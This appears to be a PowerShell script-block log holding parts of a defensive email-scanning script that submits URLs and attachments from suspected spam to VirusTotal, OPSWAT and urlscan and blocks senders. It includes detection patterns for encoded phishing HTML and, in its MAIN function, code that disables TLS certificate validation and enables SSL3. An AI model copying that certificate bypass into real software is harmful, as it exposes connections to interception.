}\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\t# URL is not null or empty do check the URL\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t\t}\r\n\t}else{ Write-OutPut \"=====================No URL in the PDF/HTML file needs to scan=====================\" &gt;&gt; $LOGFILE }\r\n}\r\n\r\nfunction CheckRedirectedURL {\r\n\tif ( $URL -like '*safelinks.protection.outlook.com*' ) { $URL = [System.Web.HttpUtility]::ParseQueryString($(New-Object -TypeName System.Uri -ArgumentList $URL).Query)[\"url\"] }\r\n\tif ($global:MODULE_LIST.'RedirectURL.py' -eq \"ON\") {\r\n\t\t$URLAccessible = &amp; python RedirectURL.py $URL\r\n\t}else{\r\n\t\t$URLAccessible = $URL\r\n\t}\r\n\tif ($URLAccessible -match \"is not accessible.\") {\r\n\t\tWrite-OutPut \"$($URL) is not accessible.\" &gt;&gt; $LOGFILE\r\n\t}else{\r\n\t\tWrite-OutPut \"    |\" &gt;&gt; $LOGFILE\r\n\t\tWrite-Output \"    |--&gt; The Redirected URL is: $($URLAccessible)\" &gt;&gt; $LOGFILE\r\n\t\tif ( (! $([System.Uri]$URL).AbsolutePath.EndsWith('/'))  -and ($EXTENSIONARRAY.contains($(([System.Uri]$URL).Segments)[-1].split(\".\")[-1])) ) {\r\n\t\t\tWrite-OutPut \"$($(([System.Uri]$URL).Segments)[-1]) no needs to scan\" &gt;&gt; $LOGFILE\r\n\t\t}else{\r\n\t\t\tSubmit-URL-Virustotal\r\n\t\t\tSubmit-URLSCAN\r\n\t\t\tGoogle-Safe-Browsing\r\n\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"  &gt;&gt; $LOGFILE\r\n\t\t\tif ( $global:enable_SecureX ) {\r\n\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t.\\MineMeld_Indicator.ps1 $URL URL -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"$($URL) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\tif ( $global:MODULE_LIST.'secureX.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t.\\secureX.ps1 $URL &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"secureX and MDATP investigation is done.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\tif ( $global:MODULE_LIST.'ESA_Spam_Block.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($global:CdoMessage) ) {\r\n\t\t\t\t\t\t$regex = [regex]\"\\&lt;(.*)\\&gt;\"\r\n\t\t\t\t\t\t$Blocklist_Sender = $($regex.match($($global:CdoMessage.From)).Groups[1].value).ToLower()\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\t$regex = \"From:.*?(?&lt;=[\\[\\&lt;]).+?(?=[\\]\\&gt;])\"\r\n\t\t\t\t\t\t$regex_eml = '([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)'\r\n\t\t\t\t\t\tif ( @([regex]::Matches($EMAIL.Body.Text, $regex).value).length -gt 1 ) { $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value[-1]), $regex_eml).value[-1] }else{  $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value), $regex_eml).value }\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($Blocklist_Sender) ) {\r\n\t\t\t\t\t\t.\\ESA_Spam_Block.ps1 $Blocklist_Sender ALL &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\tWrite-OutPut \"SPAM Sender $($Blocklist_Sender) has been blacklisted.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t}\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\t$global:enable_SecureX = $false\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tWrite-OutPut \"====================================================================\" &gt;&gt; $LOGFILE\r\n}\r\n\r\nfunction extract_hyperlink_from_Excel {\r\n\t$URLLIST = @()\r\n\t$excel = New-Object -ComObject excel.application\r\n\t$excel.visible = $False\r\n\t$workbook = $excel.Workbooks.Open($ATTFILENAME)\r\n\t$workbook.saveas($DOWNLOADDIRECTORY+'temp',44)\r\n \t#Looping the Workbook sheet to check all the sheets in the Excel\r\n\tfor ($loop_index = 1; $loop_index -le $workbook.Sheets.Count; $loop_index++)\r\n\t{\r\n\t#Assigining the hyperlinks to the Variable from each sheet\r\n\t\t$Sheet = $workbook.Worksheets($loop_index).Hyperlinks\r\n\t#looping the Sheet one by one and store it in collection\r\n\t\t$Sheet | ForEach-Object{ \r\n\t\t\t$Link = $_.Address\r\n\t\t\t$URLLIST = $URLLIST += $Link\r\n\t\t}\r\n\t}\r\n\t#Kill the excel\r\n\t$workbook.close()\r\n\tStop-Process -name excel\r\n\tRemove-Item -Path \"$($DOWNLOADDIRECTORY)temp.*\"\r\n\tRemove-Item -Force -Recurse -Path \"$($DOWNLOADDIRECTORY)temp_files\"\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\t# URL is not null or empty do check the URL\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction MAIN {\r\n\tdate\r\n\tIf(!(test-path $DOWNLOADDIRECTORY)){ New-Item -ItemType directory -Path $DOWNLOADDIRECTORY }\r\n\tIf(!(test-path $REPORTSDIRECTORY)){ New-Item -ItemType directory -Path $REPORTSDIRECTORY }\r\n\tImport-Module $EWSDLLPATH\r\n\t$SERVICE = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService([Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010_SP2)\r\n\t$SERVICE.Credentials = New-Object Net.NetworkCredential($USERNAME, $PASSWORD, $DOMAIN)\r\n\t$SERVICE.AutodiscoverUrl($EMAILADDRESS)\r\n\t$INBOX = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)\r\n\t$FOLDERROOT = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::msgFolderRoot)\r\n\t$SUBFOLDERID = ($FOLDERROOT.FindFolders([Microsoft.Exchange.WebServices.Data.FolderView]100) | where { $_.DisplayName -eq $SUBFOLDER }).Id\r\n\t$PROPERTYSET = new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)\r\n\t$PROPERTYSET.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text\r\n\t[System.Net.ServicePointManager]::SecurityProtocol = @(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3\")\r\n#\t[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12\r\n#\tUse .Net Object to ignore self-signed certificate\r\n\tif (\"TrustAllCertsPolicy\" -as [type]) {}\r\n\telse {\r\n\tAdd-Type @\"\r\n\tusing System.Net;\r\n\tusing System.Security.Cryptography.X509Certificates;\r\n\tpublic class TrustAllCertsPolicy : ICertificatePolicy {\r\n\t\tpublic bool CheckValidationResult(\r\n\t\t\tServicePoint srvPoint, X509Certificate certificate,\r\n\t\t\tWebRequest request, int certificateProblem) {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\"@\r\n\t[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\r\n\t}\r\n\tif ( $INBOX.TotalCount -ne 0 ){\r\n\t\t$ITEMS = $INBOX.FindItems($INBOX.TotalCount)\r\n\t\tforeach ( $EMAIL in $ITEMS.Items ){\r\n\t\t\t# only get unread emails\r\n\t\t\tif( $EMAIL.isread -eq $false ){\r\n\t\t\t\tif( ($EMAIL.Subject -ne \"Thank you for contacting the eHealth Saskatchewan Service Desk\") -or ($EMAIL.Subject -ne \"Service Desk Auto Reply for emailsecurity@ehealthsask.ca\") ){\r\n\t\t\t\t\t# load the property set to get to the body\r\n\t\t\t\t\t$EMAIL.load($PROPERTYSET)\r\n\t\t\t\t\t$RANDOMID = -join ((48..57) + (97..122) | Get-Random -Count 20 | % {[char]$_})\r\n\t\t\t\t\t$LOGFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".log\"\r\n\t\t\t\t\t$HTMLREPFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".html\"\r\n\t\t\t\t\t$SCREENSHOTFILE = $REPORTSDIRECTORY+\"screenshot_\"+$RANDOMID+\".jpg\"\r\n\t\t\t\t\t# output the results - first of all the From, Subject and Date Time Received\r\n\t\t\t\t\tWrite-OutPut \"====================================================================\" &gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"From:    $($EMAIL.From)\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"To:    $($EMAIL.ToRecipients)\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"</Data><Data Name='ScriptBlockId'>5b10436f-ec14-4c18-b4ca-12f2db33c2be</Data><Data Name='Path'>C:\\Users\\vagrant\\posh\\AutoSpamEmailScan.ps1</Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (2 of 3):\r\nd |  %{ $_.Split('-')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t$PERMALINK = \"https://virustotal.com/gui/url/\"+$RESULTID+\"/detection\"\r\n\tStart-Sleep -s 30\r\n\t$SCANRESULTS = Invoke-RestMethod -Method 'GET' -Uri \"https://www.virustotal.com/api/v3/urls/$RESULTID\" -Headers $HEADERS\r\n\tWrite-OutPut \"VirusTotal URL Scan Report: \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $PERMALINK &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"VirusTotal URL Scan Stats: \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $SCANRESULTS.data.attributes.last_analysis_stats &gt;&gt; $LOGFILE\r\n\tif ( ($SCANRESULTS.data.attributes.last_analysis_stats.malicious -gt 0) -or ($SCANRESULTS.data.attributes.last_analysis_stats.suspicious -gt 0) ) { $global:enable_SecureX = $true }\r\n\tWrite-OutPut \"VirusTotal URL COMMUNITY VOTES : \" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut $SCANRESULTS.data.attributes.total_votes &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n}\r\n\r\nfunction Submit-FILE-OPSWAT {\r\n\t$URI = 'https://api.metadefender.com/v4/hash/'+$HASH\r\n\t$HEADERS = @{}\r\n\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI  -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__ }\r\n\tif ( $RESPONSE -eq 404){\r\n\t\t$FILENAME = Split-Path $FILEPATH -leaf\r\n\t\t$URI = 'https://api.metadefender.com/v4/file'\r\n\t\t$HEADERS = @{}\r\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t\t$HEADERS.Add('filename', $FILENAME)\r\n\t\t$SCANRESULT = Invoke-RestMethod -Method 'Post' -Uri $URI  -Headers $HEADERS -Body $FILEPATH -ContentType 'application/octet-stream'\r\n\t\t$HASH = $SCANRESULT.sha256\r\n\t\t$DATA_ID = $SCANRESULT.data_id\r\n\t\t$URI = 'https://api.metadefender.com/v4/file/'+$DATA_ID\r\n\t\t$HEADERS = @{}\r\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\r\n\t\tDo {\r\n\t\t\tStart-Sleep -s 5\r\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__}\r\n\t\t} Until ($RESPONSE -ne 404) \r\n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" &gt;&gt; $LOGFILE\r\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\r\n\t\tWrite-OutPut $RESULTLINK &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}else {\r\n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" &gt;&gt; $LOGFILE\r\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\r\n\t\tWrite-OutPut $RESULTLINK &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}\r\n}\r\n\r\nfunction FromEmailAttachment {\r\n\t$EMLData = Get-Content $Args[0]\r\n\t$AdoDbStream = New-Object -ComObject ADODB.Stream\r\n\t$AdoDbStream.Open()\r\n\t$AdoDbStream.LoadFromFile($Args[0])\r\n\t$global:CdoMessage = New-Object -ComObject CDO.Message\r\n\t$global:CdoMessage.DataSource.OpenObject($AdoDbStream,\"_Stream\")\r\n\tWrite-OutPut \"===From:    $($global:CdoMessage.From)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===To:    $($global:CdoMessage.To)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===Subject:    $($global:CdoMessage.Subject)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"===DateTimeReceived:    $($global:CdoMessage.SentOn)\" &gt;&gt; $LOGFILE\r\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t$TextBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:textdescription\").Value\r\n\t$HTMLBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:htmldescription\").Value\r\n\t$EmailBODY = $TextBody + $HTMLBody + $EMLData\r\n\t$URLLIST = $EmailBODY | select-string -pattern $URLRegEx -AllMatches  | %{ $_.Matches } | %{ $_.Value } | Sort-Object | ? {$EXEMPTURL -notcontains $_} | Get-Unique\r\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ }\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t}\r\n\t}\r\n\t$BOUNDARY = $global:CdoMessage.Fields.Item(\"urn:schemas:mailheader:content-type\").Value | %{ $_.Split(';')[1]; } | %{ $_.Split('\"')[1]; }\r\n\tfor ($i=1;$i -le $global:CdoMessage.Attachments.count;$i++){\r\n\t\t$ContentMediaType = $global:CdoMessage.Attachments.Item($i).ContentMediaType\r\n\t\t$FILENAME = $global:CdoMessage.Attachments.Item($i).FileName\r\n\t\t$AttachmentPATTERN = \"\"\"$FILENAME\"\"(.*?)  --$BOUNDARY\"\r\n\t\t$ATTACHDATA = [regex]::match($EMLData, $AttachmentPATTERN).Groups[1].Value\r\n\t\tif ( -not [string]::IsNullOrEmpty($FILENAME) ){\r\n\t\t\t$TRIMNUM = $ATTACHDATA.LastIndexOf(\"  \")+2\r\n\t\t\t$ATTACHMENTDATA = $ATTACHDATA.Remove(0,$TRIMNUM)\r\n\t\t\t$ATTFILENAME = ($DOWNLOADDIRECTORY + $FILENAME.split('.')[0].trim() + \"_\" + $RANDOMID + \".\" + $FILENAME.split('.')[-1].trim())\r\n\t\t\tTry{ $bytes = [Convert]::FromBase64String($ATTACHMENTDATA) } catch { $Exception = $_.Exception }\r\n\t\t\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\r\n\t\t\t\tWrite-Output \"Exception Error:\" $Exception.description &gt;&gt; $LOGFILE\r\n\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE \r\n\t\t\t}\r\n\t\t\tif ( -not ([string]::IsNullOrEmpty($bytes)) ) { \r\n\t\t\t\t[IO.File]::WriteAllBytes($ATTFILENAME, $bytes)\r\n\t\t\t\tWrite-OutPut \"Downloaded Attachment : Original File $($FILENAME) Saved As $($ATTFILENAME) \" &gt;&gt; $LOGFILE\r\n\t\t\t\tTry { $ALGORITHM = (Get-FileHash ($ATTFILENAME)).Algorithm }\r\n\t\t\t\tCatch [System.SystemException] { $ExceptionError = $_.Exception.Message }\r\n\t\t\t\tif ( [string]::IsNullOrEmpty($ExceptionError) ) {\r\n\t\t\t\t\t$HASH = (Get-FileHash ($ATTFILENAME)).Hash.ToLower()\r\n\t\t\t\t\t$FILEPATH = (Get-FileHash ($ATTFILENAME)).Path\r\n\t\t\t\t\tWrite-OutPut \"Attachment $ALGORITHM Hash : \"  $HASH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t$EXTENSION = [System.IO.Path]::GetExtension($ATTFILENAME)\r\n\t\t\t\t\tif ( ($EXTENSION -eq \".pdf\") -or ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\r\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\r\n\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\r\n\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tSubmit-FILE-OPSWAT\r\n\t\t\t\t\t\tWrite-OutPut \"=====================Extract URLs from the PDF/HTML file=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\tExtractURLFromPDFHTML\r\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'selenium_simulator.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Selenimu Simulator=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\tpython selenium_simulator.py $ATTFILENAME $LOGFILE &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tif ( ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\r\n\t\t\t\t\t\t\t$HTMLCONTENT = Get-Content($FILEPATH)\r\n\t\t\t\t\t\t\tif ( ($HTMLCONTENT -like \"*atob('*')*\")  -or ($HTMLCONTENT -like \"*document.write(unescape('*')*\") -or ($HTMLCONTENT -like \"*base64*\") -or ($HTMLCONTENT -like \"*\\u00*\") ){\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*         HTML FILE IS ENCODED AND IT IS HIGHLY SUSPICIOUS         *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}else {\r\n\t\t\t\t\t\tif ( -not ([string]::IsNullOrEmpty($FILEPATH)) ){\r\n\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\r\n\t\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\r\n\t\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tSubmit-FILE-OPSWAT\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}else {\r\n\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-Output \"Exception Error:\" $ExceptionError &gt;&gt; $LOGFILE   \r\n\t\t\t\t\tWrite-OutPut \"********************************************************************\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t}\r\n\t\t\t}\t\t\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction ConvertLogToHTML {\r\n\t$File = Get-Content $LOGFILE\r\n\t$FileLine = @()\r\n\tForeach ($Line in $File) {\r\n\t\t$MyObject = New-Object -TypeName PSObject\r\n\t\tif ( ($Line -match \"virustotal.com\") -or ($Line -match \"urlscan.io\") -or ($Line -match \"opswat.com\") -or ($Line -match \"checkphish.ai\") -or ($Line -match \"googleapis.com\") ){\r\n\t\t\tif ($Line -match \".png\"){\r\n\t\t\t\tAdd-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"&lt;a href='$Line'&gt;$Line&lt;/a&gt;&lt;img src='$Line' height='640' width='800'&gt;\"\r\n\t\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"&lt;a href='$Line'&gt;$Line&lt;/a&gt;\" }\r\n\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value $Line }\r\n\t\t$FileLine += $MyObject\r\n\t}\r\n\t$($FileLine | ConvertTo-Html -Title \"Security Scan Report\" -Property \"Security Scan Report\" ) -replace '&amp;gt;','&gt;' -replace '&amp;lt;','&lt;' -replace '&amp;#39;',\"'\" | Out-File $HTMLREPFILE\r\n}\r\n\r\nfunction ExtractURLFromPDFHTML {\r\n\tif ( $EXTENSION -eq \".pdf\" ){\r\n\t\tif ( $global:MODULE_LIST.'pdf2url.py' -eq \"ON\" ) {\r\n\t\t\t$URLArrayFromPDF = &amp; python pdf2url.py $ATTFILENAME\r\n\t\t}\r\n\t}else{\r\n\t\t$HTMLFILE = $ATTFILENAME\r\n\t\t$URLArrayFromHTML = Get-Content $HTMLFILE | select-string -pattern $URLRegEx -AllMatches | %{ $_.Matches } | %{ $_.Value } | Sort-Object | Get-Unique\r\n\t}\r\n\tif ( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromHTML + $URLArrayFromPDF | Sort-Object | Get-Unique\r\n\t}elseif( [string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromHTML | Sort-Object | Get-Unique\r\n\t}elseif( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and [string]::IsNullOrEmpty($URLArrayFromHTML) ) {\r\n\t\t$URLLIST = $URLArrayFromPDF | Sort-Object | Get-Unique\r\n\t}\r\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ }\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\t# URL is not null or empty do check the URL\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t\t}\r\n\t}else{ Write-OutPut \"=====================No URL in the PDF/HTML file needs to scan=====================\" &gt;&gt; $LOGFILE }\r\n}\r\n\r\nfunction CheckRedirectedURL {\r\n\tif ( $URL -like '*safelinks.protection.outlook.com*' ) { $URL = [System.Web.HttpUtility]::ParseQueryString($(New-Object -TypeName System.Uri -ArgumentList $URL).Query)[\"url\"] }\r\n\tif ($global:MODULE_LIST.'RedirectURL.py' -eq \"ON\") {\r\n\t\t$URLAccessible = &amp; python RedirectURL.py $URL\r\n\t}else{\r\n\t\t$URLAccessible = $URL\r\n\t}\r\n\tif ($URLAccessible -match \"is not accessible.\") {\r\n\t\tWrite-OutPut \"$($URL) is not accessible.\" &gt;&gt; $LOGFILE\r\n\t}else{\r\n\t\tWrite-OutPut \"    |\" &gt;&gt; $LOGFILE\r\n\t\tWrite-Output \"    |--&gt; The Redirected URL is: $($URLAccessible)\" &gt;&gt; $LOGFILE\r\n\t\tif ( (! $([System.Uri]$URL).AbsolutePath.EndsWith('/'))  -and ($EXTENSIONARRAY.contains($(([System.Uri]$URL).Segments)[-1].split(\".\")[-1])) ) {\r\n\t\t\tWrite-OutPut \"$($(([System.Uri]$URL).Segments)[-1]) no needs to scan\" &gt;&gt; 